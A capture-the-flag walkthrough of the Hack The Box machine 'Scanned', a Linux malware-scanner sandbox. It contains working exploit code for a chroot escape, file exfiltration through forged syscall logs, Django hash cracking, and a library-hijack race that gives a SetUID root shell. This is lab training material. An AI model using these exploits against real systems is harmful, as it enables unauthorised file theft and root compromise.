# Hack The Box: Scanned - Complete Walkthrough

**Target:** `10.129.11.112`  
**Attacker:** `10.10.16.84` (Kali)  
**Machine:** Scanned (Insane Linux)  
**Flags Captured:**
- User: `0ce7fc[redacted]5d9ccfeb9f`
- Root: `1bceaec[redacted]3492b92f804`

---

## Table of Contents
1. [Overview: What Are We Facing?](#overview)
2. [Phase 1: Enumeration & Reconnaissance](#phase-1)
3. [Phase 2: Source Code Analysis (The "Source Review" Mindset)](#phase-2)
4. [Phase 3: Understanding the Vulnerabilities](#phase-3)
5. [Phase 4: Foothold - Escaping the Sandbox](#phase-4)
6. [Phase 5: User Flag - Credential Extraction & Cracking](#phase-5)
7. [Phase 6: Privilege Escalation - Abusing the Sandbox Again](#phase-6)
8. [Phase 7: Root Flag](#phase-7)
9. [Key Lessons & Hacker Mindset Summary](#lessons)

---

## Overview: What Are We Facing? <a name="overview"></a>

Scanned is a web application called **MalScanner** — a "VirusTotal-like" service where you upload Linux ELF binaries, and the site runs them in a sandbox, logging their system calls and rating them by "danger level."

**Hacker Mindset:** When you see a sandbox, your first thought should be: *"Sandboxes are designed to contain untrusted code. But sandboxes are just software, and software has bugs. My goal is to find the gap between what the sandbox promises and what it actually delivers."*

The box gives us the **source code** for both the web app and the sandbox. This is huge — we don't have to guess how it works. We can read the developer's exact logic and find their mistakes.

---

## Phase 1: Enumeration & Reconnaissance <a name="phase-1"></a>

### Step 1.1: Port Scanning

```bash
nmap -p- --min-rate 10000 10.129.11.112
nmap -p 22,80 -sCV 10.129.11.112
```

**Results:**
- **22/tcp** — OpenSSH 8.4p1 (Debian 11 Bullseye)
- **80/tcp** — nginx 1.18.0, title: "Malware Scanner"

**Hacker Mindset:** Two ports. SSH is usually a "second phase" entry point (we need creds first). HTTP is our initial attack surface. The title "Malware Scanner" tells us the site's purpose immediately.

### Step 1.2: Exploring the Website

Navigate to `http://10.129.11.112/`:
- Index page advertises a malware scanning service
- Mentions it runs on **Debian 11** using **chroot, namespaces, and ptrace**
- **Critical link:** `/static/source.tar.gz` — the **entire source code** is downloadable
- Another link leads to `/scanner/upload/` — an upload form for binaries

**Hacker Mindset:** The developer gave us the source code. This is not a bug — it's a feature they advertise ("open source"). But from an attacker's perspective, source code is a goldmine. Instead of blindly fuzzing or guessing endpoints, we can perform **white-box analysis**.

### Step 1.3: Download and Extract the Source

```bash
curl -o source.tar.gz http://10.129.11.112/static/source.tar.gz
tar xzf source.tar.gz
```

Two folders appear:
- `malscanner/` — Python Django web application
- `sandbox/` — C program that creates the sandbox environment

**Why this matters:** We now have the **exact code** running on the server. We can find logic errors, race conditions, and design flaws that black-box testing would miss.

---

## Phase 2: Source Code Analysis (The "Source Review" Mindset) <a name="phase-2"></a>

### Step 2.1: Understanding the Django App

The web app is a standard Django project with three routes:
- `/scanner/upload/` — Uploads a file
- `/viewer/<md5>/` — Views the syscall log of a submitted binary
- `/admin/` — Django admin panel

**Key file:** `malscanner/scanner/views.py`

```python
def handle_file(file):
    md5 = calculate_file_md5(file)
    path = f"{settings.FILE_PATH}/{md5}"
    with open(path, 'wb+') as f:
        for chunk in file.chunks():
            f.write(chunk)
    os.system(f"cd {settings.SBX_PATH}; ./sandbox {path} {md5}")
    os.remove(path)
    return md5
```

**What happens:**
1. Your uploaded binary is saved to `/var/www/malscanner/uploads/<md5>`
2. The sandbox is executed: `./sandbox <path> <md5>`
3. The uploaded file is **deleted** after the sandbox finishes
4. You are redirected to `/viewer/<md5>/`

**Hacker Mindset:** The uploaded file is deleted immediately after execution. This means we can't simply upload a reverse shell and connect back — the file is gone before we can do much. We need a **one-shot exploit** that accomplishes its goal during the brief execution window, or we need to **exfiltrate data through the application's own output mechanism** (the viewer page).

### Step 2.2: Understanding the Sandbox (`sandbox.c`)

The sandbox's main flow:
1. Checks it has the required Linux capabilities
2. Creates a jail directory: `jails/<md5>/`
3. Copies minimal libraries into the jail (only `libc.so.6` and the loader)
4. Calls `do_namespaces()` — unshares PID and network namespaces
5. Copies your binary into the jail as `/userprog`
6. Calls `chroot(".")` — now `/` inside the process is actually `jails/<md5>/`
7. Drops to UID 1001 (sandbox user)
8. Calls `do_trace()` which forks three processes:
   - **PID 1 (Logger):** Uses `ptrace` to log all syscalls
   - **PID 2 (Child):** Runs your uploaded binary (`/userprog`)
   - **PID 3 (Killer):** Sleeps 5 seconds, then kills PID 2

**Hacker Mindset:** Every sandbox has three potential failure modes:
1. **Escape:** Can we break out of the isolation?
2. **Persistence:** Can we leave something behind after execution?
3. **Side channels:** Can we communicate with the outside world through unintended channels?

Here, the sandbox uses `chroot`, `ptrace`, namespaces, and a killer process. It looks solid... but let's look closer.

### Step 2.3: Finding the First Bug — `prctl(PR_SET_DUMPABLE, 1)` Before Fork

In `tracing.c`, the `do_trace()` function:

```c
void do_trace() {
    // We started with capabilities - we must reset the dumpable flag
    // so that the child can be traced
    prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0);
    
    // ... capability dropping code ...
    
    int child = fork();   // PID 2
    if (child == 0) { do_child(); }
    
    int killer = fork();  // PID 3
    if (killer == 0) { do_killer(child); }
    else { do_log(child); }  // PID 1
}
```

**The Bug:** `prctl(PR_SET_DUMPABLE, 1)` is called **before any forks**. This means **all three processes** (logger, child, killer) are dumpable/traceable — not just the child as the developer intended.

**Why this matters:** On Debian, `/proc/sys/kernel/yama/ptrace_scope` defaults to `0`, meaning processes with the same UID can attach to each other (and access each other's `/proc/` entries) if they are dumpable. Our binary (PID 2) can now access `/proc/1/...` and `/proc/3/...`.

**Hacker Mindset:** Developers often add security controls, but timing matters. A control applied at the wrong point in the execution flow can be meaningless or even counterproductive. Always ask: *"When is this control applied, and what exists before/after it?"*

### Step 2.4: Finding the Second Bug — The Open File Descriptor

In `sandbox.c`:

```c
int jailsfd = -1;

void make_jail(char* name, char* program) {
    jailsfd = open("jails", O_RDONLY|__O_DIRECTORY);
    // ... create jail directory ...
    chdir("jails");
    chdir(name);
    copy_libs();
    do_namespaces();
    copy(program, "./userprog");
    chroot(".");  // <-- We are now in jail
    // ... setuid(1001) ...
    do_trace();
}
```

In `tracing.c`:

```c
void do_child() {
    // Prevent child process from escaping chroot
    close(jailsfd);  // <-- Only closed in the CHILD!
    prctl(PR_SET_PDEATHSIG, SIGHUP);
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    execve("/userprog", args, NULL);
}
```

**The Bug:** `jailsfd` is a file descriptor pointing to the `jails/` directory **outside the chroot**. It is only closed in `do_child()` (PID 2). It remains **open in PID 1 (logger) and PID 3 (killer)**.

**Why this matters:** `chroot` only changes the root directory for **path-based lookups**. If you already have an open file descriptor to something outside the jail, you can still access it. The man page for `chroot` literally warns about this:

> "This call does not close open file descriptors, and such file descriptors may allow access to files outside the chroot tree."

**Hacker Mindset:** Never trust isolation mechanisms at face value. Read the documentation. The `chroot` man page literally tells you this attack vector exists. The developer knew about it (hence the `close(jailsfd)` comment) but only fixed it in one of three processes.

---

## Phase 3: Understanding the Vulnerabilities <a name="phase-3"></a>

### How the Two Bugs Combine

1. **Bug 1** (dumpable): Allows our binary (PID 2) to access `/proc/1/...` and `/proc/3/...`
2. **Bug 2** (open fd): PID 1 and PID 3 have `jailsfd` open, which points to the `jails/` directory outside the chroot

**The Escape Path:**
- Our binary accesses `/proc/1/fd/3/` or `/proc/3/fd/3/` — this is the open file descriptor to the `jails/` directory **outside the chroot**
- From there, we can traverse up: `/proc/1/fd/3/../../../../../../etc/passwd`
- This gives us **arbitrary file read** on the entire host filesystem

**Hacker Mindset:** Individual bugs are often useless. The magic happens when you **chain** them. A file descriptor outside the jail is useless if you can't access it. The ability to access another process's `/proc/` is useless if there's nothing interesting there. But together? Game over.

### Why Not a Reverse Shell?

The sandbox calls `unshare(CLONE_NEWNET)` which creates a **new network namespace**. Your binary has no network access to the outside world. So traditional reverse shells, bind shells, or DNS exfiltration won't work.

**Hacker Mindset:** When one channel is closed, look for another. If network is isolated, use the application's **legitimate output channel** — the viewer page.

---

## Phase 4: Foothold - Escaping the Sandbox <a name="phase-4"></a>

### Step 4.1: Understanding the Log Format

The sandbox logs syscalls to `/log` inside the jail. Each log entry is exactly **64 bytes** (8 × 8-byte values):

```c
typedef struct __attribute__((__packed__)) {
    unsigned long rax;   // syscall number
    unsigned long rdi;
    unsigned long rsi;
    unsigned long rdx;
    unsigned long r10;
    unsigned long r8;
    unsigned long r9;
    unsigned long ret;   // return value
} registers;
```

The viewer page parses these 64-byte chunks and displays them. If we write our own 64-byte chunks to `/log`, the viewer will display them as if they were real syscalls.

**The Exfil Strategy:**
1. Read 8 bytes from the target file
2. Write a fake 64-byte log entry:
   - Set `rax` (syscall number) to a unique value we can identify: `0xdfdf` = 57311
   - Put the 8 bytes of file data into `ret` (the return value field)
3. Repeat for the entire file
4. Scrape the viewer page for all `sys_57311()` entries
5. Reconstruct the file from the return values

**Hacker Mindset:** You're trapped in a box with no network. But the box has a **window** — the log file that gets displayed on a webpage. If you can control what's written to the log, you can send messages through that window. This is a **covert channel** attack.

### Step 4.2: Writing the File-Read Exploit

We create `read_file.c`:

```c
#include <stdio.h>

int main() {
    size_t bytesRead = 0;

    // Escape the jail via /proc/1/fd/3 and read the Django database
    FILE *file_to_read = fopen("/proc/1/fd/3/../../../../../../../var/www/malscanner/malscanner.db", "r");
    FILE *log = fopen("/log", "a");
    char buf[64] = {0};
    ((unsigned long*)buf)[0] = 0xdfdf;  // Our "signature" syscall number

    // Read 8 bytes at a time, write fake log entries
    while ((bytesRead = fread(&buf[56], 1, 8, file_to_read)) > 0) {
        fwrite(buf, 1, 64, log);
    }

    fclose(file_to_read);
    fclose(log);
}
```

**Why static compilation?** The jail only copies `libc.so.6` and the dynamic linker. Our Kali machine is ARM64, but the target is x86_64. If we cross-compile dynamically, the binary might link against a different glibc version and fail to run. Static linking bundles everything:

```bash
x86_64-linux-gnu-gcc -static -o read_file read_file.c
```

**Hacker Mindset:** Always minimize dependencies when exploiting constrained environments. A dynamically linked binary might fail if the target's libraries don't match exactly. A statically linked binary is self-contained and more reliable.

### Step 4.3: Uploading the Exploit

```bash
curl -F "file=@read_file" http://10.129.11.112/scanner/upload/
```

The server responds with a redirect to `/viewer/<md5hash>/`.

### Step 4.4: Decoding the Exfiltrated Data

We write `decode.py`:

```python
#!/usr/bin/env python3
import re, requests, struct, sys

if len(sys.argv) < 3:
    print(f"{sys.argv[0]} [url] [output_file]")
    exit()

resp = requests.get(sys.argv[1])
if resp.status_code != 200:
    print("Failed to fetch page")
    exit()

# Find all our custom syscalls and extract the return values
words = re.findall(r"sys_57311\(\) = 0x([a-f0-9]+)", resp.text)

# Pack the hex strings back into binary data
res_file = b''.join([struct.pack("Q", int(w, 16)) for w in words])

with open(sys.argv[2], "wb") as f:
    f.write(res_file)

print(f"[+] Wrote {len(res_file)} bytes to {sys.argv[2]}")
```

Run it:
```bash
python3 decode.py http://10.129.11.112/viewer/<hash>/ malscanner.db
file malscanner.db
# Output: SQLite 3.x database
```

**What happened:** We just read an arbitrary file from the target's filesystem through a malware scanner's syscall viewer. The database is 130KB — all extracted through fake syscall log entries.

---

## Phase 5: User Flag - Credential Extraction & Cracking <a name="phase-5"></a>

### Step 5.1: Extracting the Hash from the Database

The SQLite database appears malformed when opened with `sqlite3` (likely because we captured some extra bytes at the end or beginning), but `strings` reveals the data:

```bash
strings malscanner.db | grep "md5\$"
```

Output:
```
md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf2021-09-14 18:39:55.237074clarence2021-09-14 18:36:46.227819
```

**Hacker Mindset:** When a database is corrupt or you don't know the schema, `strings` is your best friend. It extracts all printable text. Password hashes, usernames, and secrets often appear in plaintext within binary files.

### Step 5.2: Understanding the Hash Format

From the Django source (`settings.py`), we saw:
```python
PASSWORD_HASHERS = [
    "django.contrib.auth.hashers.MD5PasswordHasher"
]
```

The hash format is Django's `md5$<salt>$<hash>`:
- `md5` — algorithm
- `kL2cLcK2yhbp3za4w3752m` — salt
- `9886e17b091eb5ccdc39e436128141cf` — hash

Django's MD5 hasher computes: `MD5(salt + password)`

**Hashcat mode 20** is exactly `md5($salt.$pass)`. Hashcat expects the format: `hash:salt`

### Step 5.3: Cracking the Password

```bash
echo '9886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752m' > hash.txt
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Result:
```
9886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752m:onedayyoufeellikecrying
```

**Credentials:** `clarence:onedayyoufeellikecrying`

**Hacker Mindset:** Always check the source code for configuration details. The `settings.py` told us the exact hashing algorithm. Without that, we might waste time guessing hash types. Knowledge of the application's internals makes credential attacks much faster.

### Step 5.4: SSH Access and User Flag

```bash
ssh clarence@10.129.11.112
# Password: onedayyoufeellikecrying
cat ~/user.txt
```

**User Flag:** `0ce7fc2[redacted]d9ccfeb9f`

---

## Phase 6: Privilege Escalation - Abusing the Sandbox Again <a name="phase-6"></a>

### Step 6.1: Enumeration as Clarence

As `clarence`, there's almost nothing interesting:
- No sudo access
- No other users in `/home/`
- The only unusual thing is the **sandbox binary itself**

Check the sandbox capabilities:
```bash
/usr/sbin/getcap /var/www/malscanner/sandbox/sandbox
```

Output:
```
sandbox cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin=eip
```

**Hacker Mindset:** When `sudo -l` gives you nothing and `linpeas` finds nothing, look at what makes this box unique. The **sandbox** is the single most privileged binary on the system. It's not SUID, but it has **capabilities** — fine-grained root privileges. If you can make the sandbox do something malicious, you get those privileges.

### Step 6.2: Understanding the Root Exploit Strategy

We need to abuse the sandbox to get **root code execution**. Here's the plan:

1. **Upload a binary that sleeps** for a few seconds, then calls a **SetUID binary** from outside the jail (using the same `/proc/1/fd/3/` escape)
2. **During the sleep**, copy all required libraries into the jail, plus a **malicious shared library**
3. **Overwrite** one of the libraries the SetUID binary needs with our malicious version
4. When the SetUID binary loads our library, its **constructor runs as root**
5. Our constructor **chmod's a bash copy to SetUID root**
6. After the sandbox finishes, run the SetUID bash with `-p` to preserve root privileges

**Why this works:** SUID binaries make an implicit assumption: *"The libraries I load are trusted and only writable by root."* This assumption is **broken inside a chroot jail**, because the attacker controls the contents of the jail. We're tricking a SetUID binary into loading our malicious library inside our controlled environment.

**Hacker Mindset:** This is a classic **trusted path** attack. The kernel trusts the SUID bit on `/usr/bin/su`. The `su` binary trusts its libraries. But we control the environment where `su` runs, so we break the chain of trust. This is why `chroot` requires root — Wikipedia even warns about this exact attack.

### Step 6.3: Why `su` and `libpam_misc.so.0`?

We choose `/usr/bin/su` as our SetUID target. It depends on `libpam_misc.so.0`, which is small. We only need to provide one function (`misc_conv`) to satisfy its symbol requirements.

### Step 6.4: Writing the Exploit Files

**`runsu.c`** — The sleeper binary:
```c
#include <stdio.h>
#include <unistd.h>

int main() {
    sleep(3);  // Give us time to copy libraries into the jail
    
    // Call su from outside the jail using the fd escape
    FILE *run = popen("/proc/1/fd/3/../../../../../../../usr/bin/su", "r");
    char buf[1000] = {0};
    while (fread(buf, 1, sizeof(buf), run) > 0) {
        printf("%s", buf);
    }
    pclose(run);
}
```

**`setuidlib.c`** — The malicious library:
```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

// Stub function required by su
int misc_conv(int num_msg, const struct pam_message **msgm,
              struct pam_response **response, void *appdata_ptr) {
    return 1;
}

// This runs automatically when the library is loaded
static __attribute__((constructor)) void init(void) {
    char fn[120] = "/proc/1/fd/3/../../../../../../../../tmp/0xdf";
    chown(fn, 0, 0);       // Change owner to root
    chmod(fn, 04777);      // SetUID + world writable/executable
}
```

**Why `/proc/1/fd/3/` in the constructor?** Even though `su` is running inside the chroot, the constructor executes before `su`'s main code. We still need to escape the jail to modify `/tmp/0xdf` on the real filesystem. The same fd escape works here.

### Step 6.5: Setting Up on the Target

Copy bash to `/tmp/0xdf` (this becomes our future root shell):
```bash
cp /bin/bash /tmp/0xdf
```

Compile the exploit files on the target:
```bash
gcc -o runsu runsu.c
gcc -shared -fPIC -o setuidlib.so setuidlib.c
```

### Step 6.6: The Race Condition Exploit

We run a bash script that:
1. Starts the sandbox in the **background**
2. **Polls** until the jail directory and `usr/lib` exist
3. **Copies ALL libraries** from the host into the jail
4. **Overwrites** `libpam_misc.so.0` with our malicious library
5. Waits for the sandbox to finish

```bash
#!/bin/bash
cd /var/www/malscanner/sandbox
rm -rf jails/a 2>/dev/null

./sandbox /home/clarence/runsu a >/dev/null 2>&1 &
pid=$!

# Wait for the jail structure to be ready
until [ -d jails/a/usr/lib ]; do sleep 0.2; done

# Copy all real libraries (so su can load its dependencies)
cp -r /lib/x86_64-linux-gnu/* jails/a/usr/lib/

# Overwrite libpam_misc.so.0 with our malicious version
cp /home/clarence/setuidlib.so jails/a/usr/lib/libpam_misc.so.0

wait $pid
```

**Why copy ALL libraries?** `su` depends on `libpam.so.0`, `libaudit.so.1`, `libselinux.so.1`, `libcap-ng.so.0`, `libpthread.so.0`, etc. The sandbox only copies `libc.so.6` by default. If any dependency is missing, `su` won't start. Copying everything is the lazy but reliable approach.

**The Race:** The sandbox sleeps 3 seconds before calling `su`. We must copy our libraries into the jail **before** `su` starts. If we're too slow, `su` runs with the original (safe) libraries. If we're fast enough, `su` loads our malicious library.

**Hacker Mindset:** This is a **Time-of-Check to Time-of-Use (TOCTOU)** race condition. The sandbox checks that libraries are safe at compile time (they come from the host), but at runtime, we can modify the jail contents between when the jail is created and when the binary executes. Races are everywhere in systems programming.

### Step 6.7: Execution and Result

Run the script:
```bash
bash /home/clarence/exploit.sh
```

After ~10 seconds, check `/tmp/0xdf`:
```bash
ls -la /tmp/0xdf
```

Output:
```
-rwsrwxrwx 1 root root 1234376 ... /tmp/0xdf
```

**Success!** The file is now **SetUID root**.

---

## Phase 7: Root Flag <a name="phase-7"></a>

Run the SetUID bash with `-p` to preserve root privileges:
```bash
/tmp/0xdf -p
id
# uid=1000(clarence) gid=1000(clarence) euid=0(root)
```

Read the root flag:
```bash
cat /root/root.txt
```

**Root Flag:** `1bceae[redacted]2b92f804`

**Why `-p`?** When bash is SetUID, it normally drops privileges on startup for security. The `-p` flag tells it to **preserve** the effective UID. Without `-p`, you'd drop back to `clarence`.

**Hacker Mindset:** Knowing the quirks of your tools is essential. A SetUID `/bin/bash` doesn't automatically give you a root shell — you need to know about `-p`. Always read the man pages for the tools you're weaponizing.

---

## Key Lessons & Hacker Mindset Summary <a name="lessons"></a>

### 1. Source Code is a Weapon
The developer gave us the source. White-box analysis found two bugs that black-box testing might never catch. **Always read the source when available.**

### 2. Chain Your Bugs
Neither bug alone was enough:
- Open fd outside jail? Useless without access to it.
- Dumpable process? Useless without something valuable to access.
- **Together:** Arbitrary file read.

### 3. Read the Documentation
The `chroot` man page literally describes this escape vector. The Wikipedia page for `chroot` warns about placing SUID binaries in attacker-controlled jails. **The answers are often in plain sight.**

### 4. When Network is Blocked, Find Covert Channels
The network namespace blocked reverse shells. But the application had a **legitimate output channel** — the syscall viewer. We turned the logging mechanism into a data exfiltration channel.

### 5. Abuse Trusted Paths
SUID binaries trust their environment. Inside a chroot, that environment is attacker-controlled. By replacing a library, we made a root-privileged binary execute our code. **Break the chain of trust.**

### 6. Race to Win
The root exploit is a race condition. The sandbox creates a jail, then sleeps, then executes. We won the race by copying our malicious library into the jail during that sleep window. **Time is an attack surface.**

### 7. Know Your Tools
- `strings` for extracting data from corrupted databases
- `hashcat` mode 20 for salted MD5
- `bash -p` for preserving SetUID privileges
- Static compilation for reliable exploitation

---

*Happy hacking!*
